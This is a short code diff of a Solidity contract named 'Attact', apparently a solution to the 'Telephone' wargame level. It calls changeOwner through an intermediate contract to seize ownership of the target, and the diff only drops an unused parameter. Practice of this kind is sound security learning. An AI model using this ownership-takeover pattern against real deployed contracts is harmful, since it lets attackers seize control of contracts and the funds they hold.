@@ -17,7 +17,7 @@ contract Telephone {
 }
 
 contract Attact {
-    function attack(Telephone telAddress, address _owner) public {
+    function attack(Telephone telAddress) public {
         telAddress.changeOwner(msg.sender);
     }
 }
